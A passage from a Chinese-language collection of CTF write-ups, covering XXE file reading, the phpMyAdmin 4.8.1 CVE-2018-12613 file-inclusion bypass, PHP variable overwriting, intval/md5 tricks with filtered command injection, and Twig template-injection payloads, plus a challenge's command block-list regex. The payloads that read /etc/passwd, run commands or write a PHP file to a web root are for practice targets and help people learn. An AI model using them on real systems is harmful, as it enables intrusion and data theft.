可以看到这个数组，我们想要获取到 flag.php，他在数组的倒二个，我们可以把数组反转然后再用 next () 来获取第二个文件就是 flag.php 1?exp=var_dump(next(array_reverse(scandir(current(localeconv()))))); highlight_file 读取 flag.php 文件，最终 payload： 1?exp=highlight_file(next(array_reverse(scandir(current(localeconv()))))); 拿到 flag，flag # [NCTF2019]Fake XML cookbook 进页面之后尝试 admin 登录失败，抓包也没有获得什么信息。题目提示说 XML，查查看，看到了 XML External Entity Injection 即 xml 外部实体注入漏洞，贴一个学习链接：https://www.freebuf.com/vuls/175451.html、https://www.cnblogs.com/s1awwhy/p/13736633.html。 做一个简单的记录： XXE 漏洞全称 XML External Entity Injection 即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起 dos 攻击等危害。xxe 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传恶意 xml 文件。 XML XML 被设计为传输和存储数据，其焦点是数据的内容。 HTML 被设计用来显示数据，其焦点是数据的外观。 XML 把数据从 HTML 分离，XML 是独立于软件和硬件的信息传输工具。 基本语法： 所有 XML 元素都须有关闭标签。 XML 标签对大小写敏感。 XML 必须正确地嵌套。 XML 文档必须有根元素。 XML 的属性值须加引号 实体引用，这里看个例子，如果你把字符 “&lt;” 放在 XML，素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生 XML 错误： &lt;message&gt;hello &lt; world&lt;/message&gt; , 为了避免错误。我们用实体引用 &amp;lt; 来代替 &quot;&lt;&quot; 字符。XML 中，有 5 个预定义的实体引用。 实体名称 显示结果 描述 &amp;It; &lt; 小于 &amp;gt; &gt; 大于 &amp;amp; &amp; 和号 &amp;apos; ’ 单引号 &amp;quot; &quot; 引号 注意：在 XML 中，只有字符 &quot;&lt;“和”&amp;&quot; 是确实非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。 在 XML 中，空格会被保留，多个空格不会被合并为一个。 12345678&lt;bookstore&gt; &lt;!--根元素--&gt;&lt;book category=&quot;COOKING&quot;&gt; &lt;!--bookstore的子元素，category为属性--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt; &lt;!--book的子元素，lang为属性--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt; &lt;!--book的子元素--&gt;&lt;year&gt;2005&lt;/year&gt; &lt;!--book的子元素--&gt;&lt;price&gt;30.00&lt;/price&gt; &lt;!--book的子元素--&gt;&lt;/book&gt; &lt;!--book的结束--&gt;&lt;/bookstore&gt; &lt;!--bookstore的结束--&gt; DTD 文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。带有 DTD 的 XML 文档实例 1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt; 当使用外部 DTD 时，通过如下语法引入。 1&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt; 外部 OTD 实例： 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt; DTD - 实体 (重要) 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可以在内部或外部进行声明 内部实体 1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 外部实体 1&lt;!ENTITY 实体名称 SYSTEM &quot;文件名&quot;&gt; 参数实体 12&lt;!ENTITY %实体名称 &quot;值&quot;&gt;&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt; 参数实体 + 外部实体 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt; %name;]&gt; %name (参数实体) 是在 DTD 中被引用的，而 &amp;name; 是在 xml 文档中被引用的。 XXE 主要是利用了 DTD 引用外部实体导致的漏洞。 外部引用可支持 http、file 等协议，不同的语言支持的协议不同，但存在一些通用的协议。例如： 实际利用 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;root&lt;/password&gt;&lt;/user&gt; XXE 的危害： 任意文件读取。利用 file、http 协议，在 DTD 外部引用中注入，从而获取文件内容。任意文件读取有分为有回显和无回显两种。 命令执行。php 环境下，xml 命令执行要求 php 装有 expect 扩展。而该扩展默认没有安装。 内网探测 / SSRF。由于 xml 实体注入攻击可以利用 http:// 协议，也就是可以发起 http 请求。可以利用该请求去探查内网，进行 SSRF 攻击。 攻击内网网站。 回到题目，构造 payload 尝试文件读取： 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt; 成功，尝试获取 flag 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt; 成功拿到 flag，flag # [GWCTF 2019] 我有一个数据库 进来的页面一堆乱七八糟的内容。。。而且源码也没什么信息，dirsearch 开扫 1python dirsearch.py -u http://9a9ffbc2-edb6-47c4-9207-d90ccb6245fb.node5.buuoj.cn:81/ -e * 看看 robots.txt 12User-agent: *Disallow: phpinfo.php 看看能不能从 phpinfo 里面得到什么信息 没看到什么有用的信息，结合题目提到的数据库和扫描出的 phpmyadmin，应该重点关注 phpmyadmin/index.php 进入页面之后得到 phpmyadmin 的信息 phpMyAdmin版本信息： 4.8.1 ，查找一下相关漏洞，找到 CVE-2018-12613 PHPmyadmin 文件包含漏洞分析及漏洞利用 链接：https://blog.csdn.net/weixin_41924764/article/details/109701126、https://blog.csdn.net/weixin_44037296/article/details/111039461 最为具体的是这一个：https://blog.csdn.net/m0_46898243/article/details/106244110 这里简单记录一下： 在 4.8.2 之前的 phpMyAdmin 4.8.x 中发现了一个问题，攻击者可以在其中包含（查看并可能执行）服务器上的文件。该漏洞来自页面重定向和在 phpMyAdmin 中加载的部分代码，以及对列入白名单的页面的不正确测试。除 “$ cfg [‘AllowArbitraryServer’] = true” 情况（攻击者可以指定他 / 她已经控制的任何主机，并在 phpMyAdmin 上执行任意代码）外，攻击者还必须经过身份验证。 [‘ServerDefault’] = 0“的情况（绕过登录要求，并在没有任何身份验证的情况下运行易受攻击的代码）。 下载 phpMyAdmin 4.8.1 源码 https://www.phpmyadmin.net/files/4.8.1/ 漏洞问题出现在 index.php 页面 55~63： 12345678910// If we have a valid target, let&#x27;s load that script insteadif (! empty($_REQUEST[&#x27;target&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;]) &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;]) &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])) &#123; include $_REQUEST[&#x27;target&#x27;]; exit;&#125; 其中 include $_REQUEST['target']; 可能存在文件包含漏洞， $target 变量中不能以 index 开头，且不能是 $target_blacklist 黑名单中的内容 12345678/* * Black list of all scripts to which front-end must submit data. * Such scripts must not be loaded on home page. * */$target_blacklist = array ( &#x27;import.php&#x27;, &#x27;export.php&#x27;); 只要不是 import.php 或 export.php 即可 满足 Core 类的 checkPageValidity() 方法，在 phpMyAdmin/libraries/classes/Core.php 中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344/*** boolean phpMyAdmin.Core::checkPageValidity(string &amp;$page, array $whitelist)** checks given $page against given $whitelist and returns true if valid* it optionally ignores query parameters in $page (script.php?ignored)** @param string &amp;$page page to check* @param array $whitelist whitelist to check page against** @return boolean whether $page is valid or not (in $whitelist or not)*/public static function checkPageValidity(&amp;$page, array $whitelist = [])&#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false;&#125; 分析代码： 需要让该函数返回 true ，也就是变量 $_page 在白名单中，但白名单为空 mb_strpos() 方法是查找字符串在另一个字符串中首次出现的位置 mb_substr() 方法返回字符串的一部分 也就是经过两个函数的共同处理， $_page 变量去除了后面的传参，只保存了文件名 也就是 index.php?id=1 经处理变成了 index.php 变量 $_page 在白名单中，但白名单为空 变量 $_page 经过 urldecode() 方法，继续做如上操作 若都不满足，则返回 false 其中问题出现在 $_page = urldecode($page); 中，可以利用这个函数绕过 $whitelist 白名单的检测，构造 Pyaload： 1index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 也就是将在浏览器传入参数时， ? 进行一次解码，再经过 urldecode() 的第两次解码后，会导致 db_sql.php 作为参数而绕过白名单检测，从而实现文件读取。 payload 解析： 1target=db_sql.php%253f/../ 首先服务器接收到该传参后进行一次 URL 解码，变成 1target=db_sql.php%3f/../ 该值可以顺利的通过前 4 个条件的判断 12345! empty($_REQUEST[&#x27;target&#x27;])&amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])&amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])&amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist) 然后进入 checkPageValidity 函数，在执行 if(in_array($page, $whitelist)) 将原生的 target 值与白名单进行匹配、 if(in_array($page, $whitelist)) 将去掉传参的 targte 的值与白名单进行匹配 的时候均匹配失败 (前者匹配原声 target 的值，后者匹配去掉传参后的 target 的值)，于是执行 if(in_array($page, $whitelist)) ，在这个条件中会对该值进行 URL 解码，变成了 12target=db_sql.php?/../#%3f是?的URL编码 解码完成之后，会去除去除传参，最终变成了 target=db_sql.php ，能够成功的匹配白名单。 回到题目，这个 CVE 尝试利用，多个 ../ 是为了确保能够回到根目录，构造 payload： 1phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 成功获取到 passwd 获取 flag 1phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag # [BJDCTF2020]Mark loves cat 打开题目，琢磨了一番，没什么头绪，dirsearch 开扫，扫出了 .git/ ，那应该是源码泄露，用 githack 提取出源码，怎么使用 githack 获取源码翻之前源码泄露的题目 提取出 index.php 有用的部分 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; exit($handsome); &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125;echo &quot;the flag is: &quot;.$flag; 代码审计： 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;// $$使用不当造成变量覆盖漏洞foreach($_POST as $x =&gt; $y)&#123; $$x = $y;&#125;// 比如输入 yds=flag 相当于 $yds=$flagforeach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; //判断get传进来的值等不等于flag，如果等于flag则跳过 exit($handsome); &#125;&#125;//当既没有通过GET方法传递flag参数，也没有通过POST方法传递flag参数时，会输出$yds。if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds);&#125;//只要通过POST或者GET方法传递了名为flag的参数，并且该参数的值等于 &#x27;flag&#x27;，就会输出$is。if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125;echo &quot;the flag is: &quot;.$flag; 到这里可以感觉到有好几个方法能够获取 flag 第一种： yds=flag 123if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; exit($yds); //exit()也是可以输出的！&#125; 利用这段代码结合变量覆盖漏洞，把 $yds 和 $flag 两个变量联系起来 123foreach($_GET as $x =&gt; $y)&#123; $$x = $$y;&#125; 当我们执行 get 传参的时候让 yds=flag，传进来之后通过 foreach 函数使 $x=yds ， $y=flag ，然后 $$x = $$y 会导致变量覆盖，可以这样理解 $($x)=$($y) $x=yds $y=flag 即 $yds=$flag ，至此我们可以构建一个巨简短的 payload： 1?yds=flag 网站最底部轻松找到 flag 第二种： handsome=flag + 满足 if 条件 通过这段代码，实现让 handsome 和 yds 一样变量覆盖，然后满足 if 条件就好 12345foreach($_GET as $x =&gt; $y)&#123; if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123; exit($handsome); &#125;&#125; 满足 if 条件需要 flag=a&amp;a=flag ，因为 GET 方法获取参数 flag，所以是 a，在第二次遍历的时候参数 $x=a ，所以会有 a === a &amp;&amp; a != 'flag' 满足条件，输出 $handsome ，所以我们还需要让变量 handsome 等于变量 flag，利用变量覆盖漏洞，只需要让第一种方法的那一段代码执行后得到 $handsome = $flag 就好，构造 payload： 1?handsome=flag&amp;flag=a&amp;a=flag 这里还有更简便的一种 payload，看别的师傅的 wp 看到的，贴个 wp：https://www.cnblogs.com/Nestar/p/15922456.html 1?handsome=flag&amp;flag=handsome tql 第三种： 覆盖 is 123if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; exit($is);&#125; 这段代码就简单的不能在简单了，很好执行，只需要满足 GET 方法得到的 flag 参数等于’flag’，然后我们利用上面的变量覆盖让 $is=$flag 就输出 flag 了 payload： 1?is=flag&amp;flag=flag # [WUSTCTF2020] 朴实无华 进入页面，乱码，火狐右击定制工具栏，里面有个修复文字编码，看到人间极乐 bot？ 看到 bot 就想到 robots，尝试访问一下 robots.txt，好嘛确实有东西，不过一眼假。。。 没办法也没别的东西只能访问看看 额。。。但是在查看 header 的时候有意外发现 响应头里有个 Look_at_me: /fl4g.php 访问一下 这大图这乱码。。。文字修复一下得到代码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;金钱解决不了穷人的本质问题&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;快到非洲了&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;?&gt; 代码审计： level1 是绕过 intval 函数 level2 是 md5 弱类型比较 level3 首先是 strstr 函数对空格的限制，传入的时候就不能有空格，然后是 str_ireplace 函数把 cat 替换成 wctf2020，然后传入的 get_flag 会被 system 当作系统命令执行 ok 一层一层来吧，先来 level1 这里记录一下 intval 函数和绕过方法，学习链接 https://blog.csdn.net/wangyuxiang946/article/details/131156104 intval() 函数可以获取变量的整数值。常用于强制类型转换。 语法： 1int intval( $var, $base ) 参数： $var：需要转换成 integer 的变量 $base：转换所使用的进制 integer 是集合 ℤ = {…, -2, -1, 0, 1, 2, …} 中的某个数。 返回值： 返回值为 integer 型，可能是 0 或者 1 或者其他 0：失败或者空 array 返回 0 1：非空 array 返回 1 其他 integer 值：成功返回 $var 的 integer 值。 返回值的最大值取决于系统 32 位系统（-2147483648 到 2147483647） 64 位系统（-9223372036854775808 到 9223372036854775807） 有几个有用的功能介绍一下吧： 1、进制自动转换 第二个参数 $base 允许为空。 当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。 如果 $var 以 0 开头，就使用 8 进制 如果 $var 以 0x 开头，就使用 16 进制 其他就使用 10 进制 2、转换小数 intval () 转换小数类型时，只返回个位数，不遵循四舍五入的原则。 3、取反～ intval () 函数支持一些特殊符号的，比如 ~ 取反。 实例： 12var_dump(intval(~10));var_dump(intval(~~10)); 输出： 12int(-11)int(10) 绕过思路：当某个数字被过滤时，可以两次取反来绕过。 intval () 绕过思路（与本题无关为了拓展记录） 1）当某个数字被过滤时，可以使用它的 8 进制 / 16 进制来绕过；比如过滤 10，就用 012（八进制）或 0xA（十六进制）。 2）对于弱比较（a==b），可以给 a、b 两个参数传入空数组，使弱比较为 true。 3）当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤 3，就用 3.1。 4）当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤 3，就用 3ab。（GET 请求的参数会自动拼接单引号） 5）当某个数字被过滤时，可以两次取反来绕过；比如过滤 10，就用～～10。 6）当某个数字被过滤时，可以使用算数运算符绕过；比如过滤 10，就用 5+5 或 2*5。 学习链接：https://blog.csdn.net/qq_44879989/article/details/133418606 本题 intval 的绕过和科学计数法息息相关，这里直接实例来看看 intval 函数遇到科学计数法会怎么样，但是 intval () 在不同 PHP 版本中表现是有差异的，在 PHP7.4.3 中的表现 1234567&lt;?phpvar_dump(intval(&#x27;1e10&#x27;));echo &#x27;&lt;br&gt;&#x27;;var_dump(intval(&#x27;3.1415926e5&#x27;));echo &#x27;&lt;br&gt;&#x27;;var_dump(intval(&#x27;8724e-2&#x27;));?&gt; 从结果来看，是可以正常解读科学计数法的，那我切换成 PHP5.3.29 尝试一下，同样的代码 1234567&lt;?phpvar_dump(intval(&#x27;1e10&#x27;));echo &#x27;&lt;br&gt;&#x27;;var_dump(intval(&#x27;3.1415926e5&#x27;));echo &#x27;&lt;br&gt;&#x27;;var_dump(intval(&#x27;8724e-2&#x27;));?&gt; 出现异常 经过查询发现 intval() 在 PHP7.2.5 及以上版本 中的表现符合预期，与我们对科学计数法的认知相符。 PHP7.2.5 以下的某个版本以前 表现异常，在 PHP7.2.5 以下的某个版本 以前， intval() 函数无法正确解析字符 E 或 e ，于是 intval 在解析到 E 或 e 时立即停止，这导致科学计数法实际并未生效。 123456789101112&lt;?phpvar_dump(intval(&#x27;1E2&#x27;));var_dump(intval(1E2));var_dump(intval(&#x27;3.688e2&#x27;));var_dump(intval(3.688e2));var_dump(intval(&#x27;9999E-3&#x27;));var_dump(intval(9999E-3));?&gt; 执行效果 int(1) int(100) int(3) int(368) int(9999) int(9) 回到题目，本题的 intval 就是利用这个来尝试绕过，因为 GET 传入的类型为 string，所以会导致 intval 函数内传入的值带上了单引号，就利用上了 intval 的漏洞，本地复现一下： 123456789101112&lt;?php$num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo gettype($num); echo &#x27;&lt;br&gt;&#x27;; echo intval($num); echo &#x27;&lt;br&gt;&#x27;; echo intval($num + 1); echo &#x27;&lt;br&gt;&#x27;; echo &quot;pass&quot;;&#125;?&gt; 可以很明显的看到成功的绕过了， intval('2e4') 返回 2， intval('2e4'+1) 返回 20001 这样就绕过了 level1 level2 就很常见了 md5 加密前后都是 0e 开头科学计数法 0=0 就饶过了，就让 md5= 0e215962017 就可以了 0e215962017 0e291242476940776845150308577824 level3 既然要获得 flag 至少得知道 flag 的文件名吧，先 ls 查一下目录 构造 payload： 1?num=2e4&amp;md5=0e215962017&amp;get_flag=ls 好家伙 fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag 这么长。。。 想办法获得 flag，既然 cat 被禁了就 tac，空格被禁了就用 $IFS$1（1改成1改成1改成加其他数字貌似都行） payload： 1?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag flag 注意 tac 不是把所有内容反向输出，而是类似数组那样正常输出数组是顺序输出，tac 的话会从后往前开始输出，kali 本地复现 运行 test.php # [BJDCTF2020]Cookie is so stable 看到 Hint 点进去查看页面源代码 那就输入数据抓包查看一下 cookies 尝试 sql 注入失败了，可能是 ssti 注入？ 这里记录一下判断模板注入类型的方法，贴一个学习链接：https://blog.csdn.net/xhy18634297976/article/details/123011238 输入 &#123;&#123;7*'7'&#125;&#125; 返回 49 是 Twig 模块，返回 7777777 表示是 Jinja2 模块 那就试试看，看看应该用哪种注入模板 可以看到他返回的是 49，所以本题模板注入是 Twig 注入，找一下注入模板，因为是 Twig 注入，所以是由固定的 payload 12&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125; //查看id&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125; //查看flag 在 Cookie 里面输入 得到 flag，flag ssti 注入模板贴一个学习链接：https://www.cnblogs.com/bmjoker/p/13508538.html twig3.x 版本根据官方文档新增了 filter 和 map 等内容，补充一些新版本的 payload 在这里： 123456789101112131415161718192021&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125; # [安洵杯 2019] easy_web 查看源码能获得到的信息只有一个 md5 is funny，那很明显本题和 md5 有关，看到 url 里 img 的参数后面的值就很想把他解码了 两次 base64 解码得到 3535352e706e67 16 进制转字符串得到 555.png ，知道他回显文件的方法，可以逆向思维，尝试访问 index.php 先转 16 进制再 base64 加密两次 1234index.php696e6465782e706870 //16Njk2ZTY0NjU3ODJlNzA2ODcw //一次base64TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 //两次base64 访问 index.php 1?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd= f12 查看页面源代码，可以看到一串 base64，解码看看是不是源码 解码得到源码 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; 代码审计，最重要的是这一段 12345678910if(preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; //将cmd当作系统命令执行并输出 &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125; preg_match 的话可以使用 \\ 绕过， l\\s 效果等同于 ls md5 原本可以使用数组绕过的，但是被强制转换了，可以用相面两个数据来绕过 